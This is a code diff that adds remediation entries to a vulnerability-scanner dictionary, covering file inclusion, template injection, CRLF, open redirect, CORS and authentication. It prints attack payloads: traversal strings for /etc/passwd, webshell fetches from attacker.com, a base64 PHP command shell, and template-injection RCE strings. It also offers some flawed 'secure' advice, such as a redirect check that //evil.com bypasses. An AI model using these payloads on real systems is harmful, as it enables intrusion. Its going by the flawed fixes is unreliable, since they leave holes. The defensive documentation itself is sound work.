@@ -557,6 +557,580 @@ ERROR CODE REFERENCE:
                 'https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html',
                 'https://cwe.mitre.org/data/definitions/209.html'
             ]
+        },
+        
+        'Local File Inclusion (LFI)': {
+            'priority': 'CRITICAL',
+            'fix_time': '1-2 days',
+            'steps': [
+                'Never directly use user input in file path operations',
+                'Use whitelist of allowed files instead of blacklist',
+                'Implement strict input validation and sanitization',
+                'Use indirect object references (map IDs to file paths)',
+                'Disable allow_url_include in PHP configurations',
+                'Run application with minimal file system permissions',
+                'Use chroot jails or containerization'
+            ],
+            'exploit_example': '''
+ATTACK SCENARIO - Local File Inclusion:
+1. Identify a parameter that loads files: /page.php?file=about.php
+2. Try path traversal: /page.php?file=../../../../etc/passwd
+3. Use URL encoding: /page.php?file=....//....//....//etc/passwd
+4. Null byte injection: /page.php?file=../../../../etc/passwd%00
+5. PHP wrappers: /page.php?file=php://filter/convert.base64-encode/resource=config.php
+
+COMMON ERROR CODES:
+- Warning: include(/etc/passwd): failed to open stream
+- Fatal error: require(): Failed opening required '/var/www/../../etc/passwd'
+
+ATTACK PAYLOADS:
+../../../../etc/passwd
+....//....//....//etc/passwd
+..%2F..%2F..%2Fetc%2Fpasswd
+php://filter/convert.base64-encode/resource=config.php
+expect://ls
+''',
+            'code_example': '''
+# Bad (Vulnerable):
+$file = $_GET['page'];
+include("/var/www/pages/" . $file);
+
+# Bad (Easily bypassed):
+$file = str_replace('../', '', $_GET['page']);
+include($file);
+
+# Good (Secure - Whitelist):
+$allowed_pages = ['home', 'about', 'contact'];
+$page = $_GET['page'];
+if (in_array($page, $allowed_pages)) {
+    include("/var/www/pages/{$page}.php");
+} else {
+    die("Invalid page");
+}
+
+# Good (Indirect reference):
+$pages = [
+    1 => '/var/www/pages/home.php',
+    2 => '/var/www/pages/about.php',
+    3 => '/var/www/pages/contact.php'
+];
+$page_id = (int)$_GET['id'];
+if (isset($pages[$page_id])) {
+    include($pages[$page_id]);
+}
+
+# Python example:
+from pathlib import Path
+
+ALLOWED_FILES = {'home.html', 'about.html', 'contact.html'}
+base_dir = Path('/var/www/pages')
+filename = request.args.get('page')
+
+if filename in ALLOWED_FILES:
+    file_path = (base_dir / filename).resolve()
+    if file_path.is_relative_to(base_dir):
+        return render_template(filename)
+''',
+            'solution': '''
+SOLUTION - Prevent Local File Inclusion:
+
+1. USE WHITELIST VALIDATION:
+   - Define allowed files: allowed_files = ['home', 'about', 'contact']
+   - Reject any file not in whitelist
+   - Never trust user input for file paths
+
+2. INDIRECT OBJECT REFERENCES:
+   - Map IDs to files: {1: 'home.php', 2: 'about.php'}
+   - User provides ID, not filename
+   - Server maps ID to actual file path
+
+3. PHP CONFIGURATION (php.ini):
+   - allow_url_include = Off
+   - allow_url_fopen = Off  
+   - open_basedir = /var/www/html
+   - disable_functions = include, require, exec, system
+
+4. PATH VALIDATION:
+   - Use realpath() to resolve path
+   - Check if resolved path starts with allowed directory
+   - Reject any path with ../ or absolute paths
+
+5. FILE SYSTEM PERMISSIONS:
+   - Run web server with minimal privileges
+   - Restrict read access to necessary directories only
+   - Use chroot jails to limit file access
+
+ERROR CODE REFERENCE:
+- CWE-22: Improper Limitation of a Pathname to a Restricted Directory
+- CWE-98: Improper Control of Filename for Include/Require Statement
+- CWE-73: External Control of File Name or Path
+''',
+            'references': [
+                'OWASP Path Traversal',
+                'CWE-22: Path Traversal',
+                'CWE-98: PHP File Inclusion',
+                'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion'
+            ]
+        },
+        
+        'Remote File Inclusion (RFI)': {
+            'priority': 'CRITICAL',
+            'fix_time': '1 day',
+            'steps': [
+                'Disable allow_url_include and allow_url_fopen in PHP',
+                'Never include files from user-controlled URLs',
+                'Validate and whitelist all included resources',
+                'Use Content Security Policy headers',
+                'Implement strict input validation',
+                'Monitor for suspicious file inclusion attempts'
+            ],
+            'exploit_example': '''
+ATTACK SCENARIO - Remote File Inclusion:
+1. Find include/require with user input: include($_GET['page'])
+2. Host malicious file: http://attacker.com/shell.txt
+3. Inject URL: /page.php?page=http://attacker.com/shell.txt
+4. Server includes and executes remote code
+
+ATTACK PAYLOADS:
+?page=http://attacker.com/webshell.txt
+?page=http://attacker.com/malware.txt?
+?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
+''',
+            'code_example': '''
+# Bad (Vulnerable):
+include($_GET['module'] . '.php');
+
+# Good (PHP Configuration):
+; php.ini
+allow_url_include = Off
+allow_url_fopen = Off
+open_basedir = /var/www/html
+
+# Good (Whitelist):
+$allowed = ['home', 'about', 'products'];
+$module = $_GET['module'];
+if (in_array($module, $allowed)) {
+    include("{$module}.php");
+}
+''',
+            'solution': '''
+SOLUTION:
+1. Disable remote file inclusion: allow_url_include = Off
+2. Disable remote file operations: allow_url_fopen = Off
+3. Use whitelist for all file inclusions
+4. Never use user input directly in include/require
+5. Set open_basedir restriction
+6. Use Content-Security-Policy header
+
+ERROR CODE: CWE-98 (PHP File Inclusion)
+''',
+            'references': [
+                'OWASP Testing for RFI',
+                'CWE-98: Improper Control of Filename',
+                'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion'
+            ]
+        },
+        
+        'Server-Side Template Injection (SSTI)': {
+            'priority': 'CRITICAL',
+            'fix_time': '2-3 days',
+            'steps': [
+                'Never pass user input directly to template engines',
+                'Use sandbox mode for template rendering',
+                'Implement strict input validation',
+                'Use logic-less template engines when possible',
+                'Disable dangerous template features in production',
+                'Implement Content Security Policy',
+                'Use template engines with auto-escaping enabled'
+            ],
+            'exploit_example': '''
+ATTACK SCENARIO - SSTI (Jinja2 Example):
+1. Find template injection point: Hello {{name}}!
+2. Test with: {{7*7}} - if renders as 49, vulnerable
+3. Exploit: {{config.items()}} - reveals configuration
+4. RCE: {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+
+COMMON PAYLOADS:
+# Jinja2/Flask:
+{{7*7}}
+{{config}}
+{{self.__dict__}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}
+
+# Twig:
+{{7*7}}
+{{_self.env.getRuntime("Twig_Error_Runtime").getSourceContext()}}
+
+# Freemarker:
+${7*7}
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
+''',
+            'code_example': '''
+# Bad (Vulnerable - Jinja2):
+from jinja2 import Template
+user_input = request.args.get('name')
+template = Template('Hello ' + user_input + '!')
+output = template.render()
+
+# Good (Secure - Pass as variable):
+from jinja2 import Environment, select_autoescape
+env = Environment(autoescape=select_autoescape(['html', 'xml']))
+template = env.from_string('Hello {{ name }}!')
+output = template.render(name=user_input)
+
+# Good (Django - Auto-escaping):
+from django.template import Template, Context
+template = Template('Hello {{ name }}!')
+context = Context({'name': user_input})
+output = template.render(context)
+
+# Good (Use logic-less templates):
+import pystache
+template = 'Hello {{name}}!'
+output = pystache.render(template, {'name': user_input})
+''',
+            'solution': '''
+SOLUTION - Prevent SSTI:
+
+1. NEVER CONCATENATE USER INPUT INTO TEMPLATES:
+   - Bad: Template('Hello ' + user_input)
+   - Good: Template('Hello {{ name }}').render(name=user_input)
+
+2. ENABLE AUTO-ESCAPING:
+   - Jinja2: autoescape=select_autoescape(['html', 'xml'])
+   - Django: Auto-enabled by default
+   - Always escape user content
+
+3. USE SANDBOX MODE:
+   - Jinja2: from jinja2.sandbox import SandboxedEnvironment
+   - Restrict dangerous functions and attributes
+   - Disable code execution features
+
+4. INPUT VALIDATION:
+   - Validate all user input before rendering
+   - Use whitelist for allowed characters
+   - Reject template syntax characters
+
+5. CONSIDER LOGIC-LESS TEMPLATES:
+   - Use Mustache, Handlebars
+   - No code execution capabilities
+   - Safer for untrusted input
+
+ERROR CODE REFERENCE:
+- CWE-94: Improper Control of Generation of Code
+- CWE-74: Improper Neutralization of Special Elements
+''',
+            'references': [
+                'OWASP Server-Side Template Injection',
+                'CWE-94: Code Injection',
+                'https://portswigger.net/web-security/server-side-template-injection',
+                'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection'
+            ]
+        },
+        
+        'CRLF Injection': {
+            'priority': 'MEDIUM',
+            'fix_time': '1-2 days',
+            'steps': [
+                'Validate and sanitize all user input used in HTTP headers',
+                'Remove or encode CR (\\r) and LF (\\n) characters',
+                'Use framework built-in header functions',
+                'Implement strict input validation',
+                'Set proper Content-Type headers',
+                'Use HTTP security headers'
+            ],
+            'exploit_example': '''
+ATTACK SCENARIO - CRLF Injection:
+1. Find parameter reflected in headers
+2. Inject CRLF characters to split response
+3. Example: /redirect?url=http://example.com%0d%0aSet-Cookie:admin=true
+
+ATTACK PAYLOADS:
+# HTTP Response Splitting:
+?url=http://example.com%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>
+
+# Cookie Injection:
+?redirect=%0d%0aSet-Cookie:%20admin=true
+
+# Header Injection:
+?name=admin%0d%0aX-Custom-Header:%20injected
+''',
+            'code_example': '''
+# Bad (Vulnerable):
+redirect_url = request.GET['url']
+response = HttpResponse()
+response['Location'] = redirect_url
+return response
+
+# Good (Sanitize):
+import re
+
+def sanitize_header(value):
+    # Remove CRLF characters
+    return re.sub(r'[\r\n]', '', value)
+
+redirect_url = sanitize_header(request.GET['url'])
+return redirect(redirect_url)
+
+# Good (Use framework functions):
+from django.http import HttpResponseRedirect
+return HttpResponseRedirect(request.GET['url'])  # Django sanitizes automatically
+''',
+            'solution': '''
+SOLUTION:
+1. Remove \\r and \\n: value = value.replace('\\r', '').replace('\\n', '')
+2. Use framework header functions (they handle sanitization)
+3. Validate URLs before redirects
+4. Implement Content-Security-Policy
+5. Never directly concatenate user input into headers
+
+ERROR CODE: CWE-113 (CRLF Injection)
+''',
+            'references': [
+                'OWASP CRLF Injection',
+                'CWE-113: Improper Neutralization of CRLF Sequences',
+                'https://owasp.org/www-community/vulnerabilities/CRLF_Injection'
+            ]
+        },
+        
+        'Open Redirect': {
+            'priority': 'MEDIUM',
+            'fix_time': '1 day',
+            'steps': [
+                'Implement whitelist of allowed redirect URLs',
+                'Validate URLs before redirecting',
+                'Use relative URLs instead of absolute URLs',
+                'Implement indirect object references for redirects',
+                'Show warning page before external redirects',
+                'Never redirect based on unvalidated user input'
+            ],
+            'exploit_example': '''
+ATTACK SCENARIO - Open Redirect:
+1. Find redirect parameter: /redirect?url=/home
+2. Change to external: /redirect?url=http://evil.com
+3. Use in phishing: http://trusted.com/redirect?url=http://phishing.com
+
+ATTACK PAYLOADS:
+?redirect=http://evil.com
+?next=//evil.com
+?url=https://evil.com
+?return=javascript:alert(1)
+''',
+            'code_example': '''
+# Bad (Vulnerable):
+redirect_url = request.GET['url']
+return redirect(redirect_url)
+
+# Good (Whitelist):
+ALLOWED_DOMAINS = ['example.com', 'trusted.com']
+redirect_url = request.GET['url']
+parsed = urlparse(redirect_url)
+if parsed.netloc in ALLOWED_DOMAINS:
+    return redirect(redirect_url)
+
+# Good (Relative URLs only):
+redirect_path = request.GET.get('next', '/')
+if not redirect_path.startswith('http'):
+    return redirect(redirect_path)
+
+# Good (Indirect reference):
+REDIRECT_MAP = {
+    'home': '/dashboard',
+    'profile': '/user/profile',
+    'logout': '/auth/logout'
+}
+redirect_id = request.GET['dest']
+return redirect(REDIRECT_MAP.get(redirect_id, '/'))
+''',
+            'solution': '''
+SOLUTION:
+1. Whitelist allowed domains
+2. Use relative paths only
+3. Validate URL format
+4. Show warning for external redirects
+5. Use indirect references
+
+ERROR CODE: CWE-601 (URL Redirection to Untrusted Site)
+''',
+            'references': [
+                'OWASP Unvalidated Redirects',
+                'CWE-601: URL Redirection to Untrusted Site',
+                'https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html'
+            ]
+        },
+        
+        'CORS Misconfiguration': {
+            'priority': 'HIGH',
+            'fix_time': '1 day',
+            'steps': [
+                'Never use Access-Control-Allow-Origin: *',
+                'Implement strict whitelist of allowed origins',
+                'Validate Origin header before setting CORS headers',
+                'Avoid reflecting Origin header without validation',
+                'Use credentials only with specific origins',
+                'Implement proper preflight request handling'
+            ],
+            'exploit_example': '''
+ATTACK SCENARIO - CORS Misconfiguration:
+1. Website sets: Access-Control-Allow-Origin: *
+2. Attacker page can read sensitive data from API
+3. Steal user data via JavaScript from attacker's site
+
+VULNERABLE CONFIGURATIONS:
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true
+
+Access-Control-Allow-Origin: {user_provided_origin}
+Access-Control-Allow-Credentials: true
+''',
+            'code_example': '''
+# Bad (Vulnerable):
+response['Access-Control-Allow-Origin'] = '*'
+response['Access-Control-Allow-Credentials'] = 'true'
+
+# Bad (Reflects any origin):
+origin = request.headers.get('Origin')
+response['Access-Control-Allow-Origin'] = origin
+response['Access-Control-Allow-Credentials'] = 'true'
+
+# Good (Whitelist):
+ALLOWED_ORIGINS = [
+    'https://app.example.com',
+    'https://mobile.example.com'
+]
+origin = request.headers.get('Origin')
+if origin in ALLOWED_ORIGINS:
+    response['Access-Control-Allow-Origin'] = origin
+    response['Access-Control-Allow-Credentials'] = 'true'
+
+# Good (Pattern matching):
+import re
+origin = request.headers.get('Origin', '')
+if re.match(r'https://.*\\.example\\.com$', origin):
+    response['Access-Control-Allow-Origin'] = origin
+''',
+            'solution': '''
+SOLUTION:
+1. Never use wildcard (*) with credentials
+2. Whitelist specific origins
+3. Validate Origin header
+4. Use specific domains, not *
+5. Implement proper preflight handling
+
+ERROR CODE: CWE-346 (Origin Validation Error)
+''',
+            'references': [
+                'OWASP CORS Misconfiguration',
+                'CWE-346: Origin Validation Error',
+                'https://portswigger.net/web-security/cors'
+            ]
+        },
+        
+        'Sensitive Data Exposure': {
+            'priority': 'HIGH',
+            'fix_time': '2-3 days',
+            'steps': [
+                'Encrypt sensitive data at rest and in transit',
+                'Use HTTPS for all communications',
+                'Implement proper key management',
+                'Mask sensitive data in logs and error messages',
+                'Use strong encryption algorithms (AES-256)',
+                'Implement data classification and handling policies',
+                'Remove sensitive data from source code and version control'
+            ],
+            'code_example': '''
+# Bad (Storing passwords in plain text):
+user.password = request.POST['password']
+user.save()
+
+# Good (Hash passwords):
+import bcrypt
+password_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt())
+user.password_hash = password_hash
+
+# Good (Encrypt sensitive data):
+from cryptography.fernet import Fernet
+key = Fernet.generate_key()
+f = Fernet(key)
+encrypted_ssn = f.encrypt(ssn.encode())
+
+# Good (Use environment variables):
+import os
+api_key = os.environ.get('API_KEY')  # Not hardcoded
+''',
+            'solution': '''
+SOLUTION:
+1. Always use HTTPS
+2. Encrypt data at rest (AES-256)
+3. Hash passwords (bcrypt, Argon2)
+4. Never log sensitive data
+5. Use secure key management
+6. Implement data masking
+
+ERROR CODES: CWE-311, CWE-312, CWE-319
+''',
+            'references': [
+                'OWASP Sensitive Data Exposure',
+                'CWE-311: Missing Encryption',
+                'https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure'
+            ]
+        },
+        
+        'Broken Authentication': {
+            'priority': 'CRITICAL',
+            'fix_time': '2-4 days',
+            'steps': [
+                'Implement multi-factor authentication',
+                'Use strong password policies',
+                'Implement account lockout mechanisms',
+                'Use secure session management',
+                'Implement proper logout functionality',
+                'Use secure password reset mechanisms',
+                'Monitor for brute force attempts'
+            ],
+            'code_example': '''
+# Bad (Weak authentication):
+if username == "admin" and password == "password":
+    session['user'] = username
+
+# Good (Secure authentication):
+import bcrypt
+from datetime import datetime, timedelta
+
+user = User.query.filter_by(username=username).first()
+if user and bcrypt.checkpw(password.encode(), user.password_hash):
+    if user.failed_attempts >= 5:
+        if user.locked_until and user.locked_until > datetime.now():
+            return "Account locked"
+        user.failed_attempts = 0
+    
+    session['user_id'] = user.id
+    session['logged_in_at'] = datetime.now()
+    user.failed_attempts = 0
+    user.save()
+else:
+    if user:
+        user.failed_attempts += 1
+        if user.failed_attempts >= 5:
+            user.locked_until = datetime.now() + timedelta(minutes=30)
+        user.save()
+''',
+            'solution': '''
+SOLUTION:
+1. Implement MFA
+2. Use strong password hashing (bcrypt/Argon2)
+3. Account lockout after failed attempts
+4. Secure session tokens
+5. Implement CAPTCHA
+6. Monitor authentication failures
+
+ERROR CODE: CWE-287 (Improper Authentication)
+''',
+            'references': [
+                'OWASP Authentication Cheat Sheet',
+                'CWE-287: Improper Authentication',
+                'https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html'
+            ]
         }
     }
     
